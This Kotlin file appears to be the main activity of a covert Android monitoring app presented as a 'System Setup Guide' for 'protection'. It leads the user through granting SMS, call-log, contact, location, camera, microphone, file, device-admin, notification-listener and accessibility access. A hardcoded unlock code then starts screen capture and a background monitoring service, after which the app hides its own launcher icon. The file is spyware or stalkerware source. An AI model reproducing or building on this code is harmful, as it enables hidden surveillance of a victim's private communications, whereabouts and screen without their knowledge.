package com.example.systemservice

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.InputType
import android.view.Gravity
import android.widget.*
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.app.NotificationManagerCompat

class MainActivity : Activity() {
    private val REQUEST_CODE = 123
    private val SCREEN_CAPTURE_REQUEST = 1001

    private lateinit var statusContainer: LinearLayout

    private val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS
        )
    } else {
        arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS
        )
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setupPermissionUI()
        refreshStatus()
    }

    private fun setupPermissionUI() {
        val mainLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(40, 60, 40, 40)
            setBackgroundColor(Color.parseColor("#F5F7FA"))
        }

        val title = TextView(this).apply {
            text = "System Setup Guide"
            textSize = 22f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#2D3748"))
            setPadding(0, 0, 0, 10)
        }
        mainLayout.addView(title)

        val desc = TextView(this).apply {
            text = "Follow all steps to enable deep monitoring."
            textSize = 13f
            setTextColor(Color.parseColor("#718096"))
            setPadding(0, 0, 0, 40)
        }
        mainLayout.addView(desc)

        statusContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
        }
        mainLayout.addView(statusContainer)

        val unlockSection = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, 40, 0, 0)
        }
        
        val input = EditText(this).apply {
            hint = "Security Code"
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
            setPadding(20, 20, 20, 20)
        }
        unlockSection.addView(input)

        val btn = Button(this).apply {
            text = "START PROTECTION"
            setBackgroundColor(Color.parseColor("#4A90E2"))
            setTextColor(Color.WHITE)
            setOnClickListener {
                if (input.text.toString() == "Qauabhatti") {
                    if (allGranted()) {
                        startMonitorService()
                    } else {
                        Toast.makeText(this@MainActivity, "Please FIX all indicators first!", Toast.LENGTH_LONG).show()
                    }
                } else {
                    Toast.makeText(this@MainActivity, "Invalid Code", Toast.LENGTH_SHORT).show()
                }
            }
        }
        unlockSection.addView(btn)
        mainLayout.addView(unlockSection)

        val scroll = ScrollView(this)
        scroll.addView(mainLayout)
        setContentView(scroll)
    }

    private fun refreshStatus() {
        statusContainer.removeAllViews()

        addStatusItem("1. Core Permissions", hasPermissions()) {
            ActivityCompat.requestPermissions(this, permissions, REQUEST_CODE)
        }

        addStatusItem("2. Device Admin", isDeviceAdminActive()) {
            requestDeviceAdmin()
        }

        addStatusItem("3. Notification Log", isNotificationAccessEnabled()) {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }

        addStatusItem("4. System Assistant", isAccessibilityServiceEnabled()) {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            addStatusItem("5. All Files Access", Environment.isExternalStorageManager()) {
                val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                startActivity(intent)
            }
        }

        addStatusItem("6. Battery Limit", isIgnoringBattery()) {
            requestBatteryOptimizationExemption()
        }
    }

    private fun addStatusItem(label: String, isGranted: Boolean, onFix: () -> Unit) {
        val item = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setPadding(20, 20, 20, 20)
            gravity = Gravity.CENTER_VERTICAL
            val params = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
            params.setMargins(0, 0, 0, 15)
            layoutParams = params
            setBackgroundColor(Color.WHITE)
        }

        val icon = TextView(this).apply {
            text = if (isGranted) "READY" else "FIX"
            textSize = 12f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(if (isGranted) Color.parseColor("#48BB78") else Color.parseColor("#F56565"))
            setPadding(0, 0, 30, 0)
        }
        item.addView(icon)

        val textLabel = TextView(this).apply {
            text = label
            textSize = 15f
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            setTextColor(Color.parseColor("#4A5568"))
        }
        item.addView(textLabel)

        if (!isGranted) {
            val fixBtn = Button(this).apply {
                text = "OPEN"
                textSize = 10f
                setOnClickListener { onFix() }
            }
            item.addView(fixBtn)
        }
        statusContainer.addView(item)
    }

    private fun allGranted(): Boolean {
        var all = hasPermissions() && isDeviceAdminActive() && isNotificationAccessEnabled() && isAccessibilityServiceEnabled() && isIgnoringBattery()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            all = all && Environment.isExternalStorageManager()
        }
        return all
    }

    private fun isIgnoringBattery(): Boolean {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            pm.isIgnoringBatteryOptimizations(packageName)
        } else true
    }

    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (e: Exception) {
                try {
                    startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
                } catch (ex: Exception) {}
            }
        }
    }

    private fun isDeviceAdminActive(): Boolean {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isAdminActive(ComponentName(this, AdminReceiver::class.java))
    }

    private fun isNotificationAccessEnabled(): Boolean {
        return NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val expectedComponentName = ComponentName(this, AutoClickService::class.java)
        val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        return enabledServices.split(":").any { it.contains(expectedComponentName.flattenToString()) }
    }

    private fun requestDeviceAdmin() {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this@MainActivity, AdminReceiver::class.java))
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Activate for deep protection.")
        }
        startActivity(intent)
    }

    private fun hasPermissions(): Boolean {
        return permissions.all { ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SCREEN_CAPTURE_REQUEST && resultCode == RESULT_OK && data != null) {
            val serviceIntent = Intent(this, MonitorService::class.java).apply {
                putExtra("resultCode", resultCode)
                putExtra("data", data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(serviceIntent)
            else startService(serviceIntent)
            Handler(Looper.getMainLooper()).postDelayed({ hideAppIcon(); finish() }, 2000)
        }
    }

    private fun startMonitorService() {
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(projectionManager.createScreenCaptureIntent(), SCREEN_CAPTURE_REQUEST)
    }

    private fun hideAppIcon() {
        packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
    }
    
    override fun onResume() {
        super.onResume()
        refreshStatus()
    }
}
